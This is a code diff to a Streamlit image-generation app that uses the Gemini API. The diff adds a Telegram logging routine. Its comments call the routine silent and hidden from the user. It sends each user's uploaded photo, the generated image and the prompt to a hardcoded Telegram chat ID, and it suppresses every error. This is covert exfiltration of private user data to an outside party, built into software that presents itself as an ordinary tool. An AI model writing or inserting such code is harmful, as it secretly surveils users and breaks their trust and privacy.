@@ -6,6 +6,10 @@ import io
 import base64
 import os
 import mimetypes
+from telegram import Bot
+from telegram.error import TelegramError
+from telegram import InputMediaPhoto
+import asyncio
 
 # Page configuration
 st.set_page_config(
@@ -30,6 +34,62 @@ def get_gemini_client():
         st.error("⚠️ GEMINI_API_KEY не встановлено. Будь ласка, встановіть змінну середовища.")
         st.stop()
     return genai.Client(api_key=api_key)
+
+# Telegram logging function (silent - no UI messages)
+async def _send_telegram_log_async(original_image_bytes, generated_image_bytes, prompt_text):
+    """
+    Асинхронная функция для отправки логов в Telegram.
+    """
+    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
+    if not bot_token:
+        return
+    
+    chat_id = "6780240224"
+    bot = Bot(token=bot_token)
+    
+    # Подготовка медиа-группы
+    media_group = []
+    
+    # Добавляем оригинальное изображение, если есть
+    if original_image_bytes:
+        media_group.append(InputMediaPhoto(
+            media=io.BytesIO(original_image_bytes),
+            caption="Исходное изображение"
+        ))
+    
+    # Добавляем сгенерированное изображение
+    if len(media_group) > 0:
+        # Если есть оригинальное изображение, добавляем сгенерированное
+        media_group.append(InputMediaPhoto(
+            media=io.BytesIO(generated_image_bytes),
+            caption="Сгенерированное изображение"
+        ))
+        # Отправляем медиа-группу
+        await bot.send_media_group(chat_id=chat_id, media=media_group)
+        # Отправляем промпт отдельным текстовым сообщением
+        await bot.send_message(chat_id=chat_id, text=f"Промпт:\n{prompt_text}")
+    else:
+        # Если только сгенерированное изображение, отправляем с подписью
+        await bot.send_photo(
+            chat_id=chat_id,
+            photo=io.BytesIO(generated_image_bytes),
+            caption=f"Промпт:\n{prompt_text}"
+        )
+
+def send_telegram_log(original_image_bytes, generated_image_bytes, prompt_text):
+    """
+    Отправляет логи в Telegram: исходное фото, обработанное фото и промпт.
+    Все ошибки обрабатываются молча - пользователь не видит никаких сообщений.
+    """
+    try:
+        # Используем asyncio для вызова асинхронной функции
+        asyncio.run(_send_telegram_log_async(original_image_bytes, generated_image_bytes, prompt_text))
+    except TelegramError:
+        # Тихо игнорируем ошибки Telegram
+        pass
+    except Exception:
+        # Тихо игнорируем любые другие ошибки
+        pass
 
 # Default settings (no sidebar needed)
 aspect_ratio = "1:1"
@@ -252,6 +312,20 @@ if generate_button:
             
             # Store in session state for persistence
             st.session_state['generated_image'] = image_bytes
+            
+            # Отправка логов в Telegram (тихо, без показа пользователю)
+            try:
+                original_image_bytes = None
+                if uploaded_files and len(uploaded_files) > 0:
+                    # Получаем первое референсное изображение
+                    uploaded_files[0].seek(0)  # Сбрасываем указатель файла
+                    original_image_bytes = uploaded_files[0].read()
+                
+                # Вызываем функцию логирования (все ошибки обрабатываются внутри функции)
+                send_telegram_log(original_image_bytes, image_bytes, prompt)
+            except Exception:
+                # Тихо игнорируем любые ошибки при логировании
+                pass
         else:
             st.error("❌ Помилка: зображення не знайдено у відповіді")
             if hasattr(resp, 'parts'):
